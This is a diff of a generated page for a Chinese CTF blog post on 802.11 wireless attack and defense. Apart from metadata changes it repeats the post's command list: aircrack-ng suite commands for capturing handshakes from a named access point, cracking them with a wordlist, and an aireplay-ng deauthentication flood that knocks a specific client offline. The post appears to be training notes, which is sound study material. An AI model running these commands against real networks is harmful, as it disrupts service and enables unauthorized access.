@@ -64,10 +64,10 @@
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.1">
 
 
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png?v=6.4.1">
+  <link rel="icon" type="image/png" sizes="32x32" href="/./favicon.ico?v=6.4.1">
 
 
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.png?v=6.4.1">
+  <link rel="icon" type="image/png" sizes="16x16" href="/./favicon.ico?v=6.4.1">
 
 
   <link rel="mask-icon" href="/images/logo.svg?v=6.4.1" color="#222">
@@ -115,7 +115,7 @@
 <meta property="og:url" content="https://yuuoniy.github.io/2018/08/17/XMAN-wireless-attack-with-defense/index.html">
 <meta property="og:site_name" content="尿尿">
 <meta property="og:description" content="常见的无线攻击威胁fake ap攻击ARP&amp;amp;Dns劫持WIFI DOS 公攻击操作命令：iwconfigairmairodump-ng 名称airmon-ng start nameairodump-ng --bssid xxx -c 信道 -w 保存文件 wlan0monaircrack-ng 包 -w 字典airodump-ng --bssid B4:0B:44:C2:D5:FF -c">
-<meta property="og:updated_time" content="2018-09-11T02:06:57.428Z">
+<meta property="og:updated_time" content="2018-09-21T12:26:14.648Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="CTF | 无线网络-802.11攻与防">
 <meta name="twitter:description" content="常见的无线攻击威胁fake ap攻击ARP&amp;amp;Dns劫持WIFI DOS 公攻击操作命令：iwconfigairmairodump-ng 名称airmon-ng start nameairodump-ng --bssid xxx -c 信道 -w 保存文件 wlan0monaircrack-ng 包 -w 字典airodump-ng --bssid B4:0B:44:C2:D5:FF -c">
@@ -385,7 +385,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2018-09-11 10:06:57" itemprop="dateModified" datetime="2018-09-11T10:06:57+08:00">2018-09-11</time>
+                <time title="Modified: 2018-09-21 20:26:14" itemprop="dateModified" datetime="2018-09-21T20:26:14+08:00">2018-09-21</time>
               
             
           </span>
@@ -435,7 +435,7 @@
                 
                   <span class="post-meta-item-text">Symbols count in article: </span>
                 
-                <span title="Symbols count in article">785</span>
+                <span title="Symbols count in article">786</span>
               
 
               
@@ -469,7 +469,8 @@
       
 
       
-        <h3 id="常见的无线攻击威胁"><a href="#常见的无线攻击威胁" class="headerlink" title="常见的无线攻击威胁"></a>常见的无线攻击威胁</h3><h4 id="fake-ap攻击"><a href="#fake-ap攻击" class="headerlink" title="fake ap攻击"></a>fake ap攻击</h4><h4 id="ARP-amp-Dns劫持"><a href="#ARP-amp-Dns劫持" class="headerlink" title="ARP&amp;Dns劫持"></a>ARP&amp;Dns劫持</h4><h4 id="WIFI-DOS-公攻击"><a href="#WIFI-DOS-公攻击" class="headerlink" title="WIFI DOS 公攻击"></a>WIFI DOS 公攻击</h4><h4 id="操作命令："><a href="#操作命令：" class="headerlink" title="操作命令："></a>操作命令：</h4><p><code>iwconfig</code><br><code>airm</code><br><code>airodump-ng 名称</code><br><code>airmon-ng start name</code><br><code>airodump-ng --bssid xxx -c 信道 -w 保存文件 wlan0mon</code><br><code>aircrack-ng 包 -w 字典</code><br><code>airodump-ng --bssid B4:0B:44:C2:D5:FF -c 11 -w xmantest wlan0mon</code><br><code>--ivs</code> 只抓握手包</p>
+        <a id="more"></a>
+<h3 id="常见的无线攻击威胁"><a href="#常见的无线攻击威胁" class="headerlink" title="常见的无线攻击威胁"></a>常见的无线攻击威胁</h3><h4 id="fake-ap攻击"><a href="#fake-ap攻击" class="headerlink" title="fake ap攻击"></a>fake ap攻击</h4><h4 id="ARP-amp-Dns劫持"><a href="#ARP-amp-Dns劫持" class="headerlink" title="ARP&amp;Dns劫持"></a>ARP&amp;Dns劫持</h4><h4 id="WIFI-DOS-公攻击"><a href="#WIFI-DOS-公攻击" class="headerlink" title="WIFI DOS 公攻击"></a>WIFI DOS 公攻击</h4><h4 id="操作命令："><a href="#操作命令：" class="headerlink" title="操作命令："></a>操作命令：</h4><p><code>iwconfig</code><br><code>airm</code><br><code>airodump-ng 名称</code><br><code>airmon-ng start name</code><br><code>airodump-ng --bssid xxx -c 信道 -w 保存文件 wlan0mon</code><br><code>aircrack-ng 包 -w 字典</code><br><code>airodump-ng --bssid B4:0B:44:C2:D5:FF -c 11 -w xmantest wlan0mon</code><br><code>--ivs</code> 只抓握手包</p>
 <p><code>airodump-ng wlan0mon</code></p>
 <p>切换信道：<br><code>iwconfig wlan0mon channel 11</code><br>踢下线：<br><code>aireplay-ng -0 10000 -a  B4:0B:44:C2:D5:FF -c C4:B3:01:C4:27:31 wlan0mon</code><br>wlan.fc.type_subtype==12</p>
 <h3 id="无线攻防与进阶"><a href="#无线攻防与进阶" class="headerlink" title="无线攻防与进阶"></a>无线攻防与进阶</h3><ul>
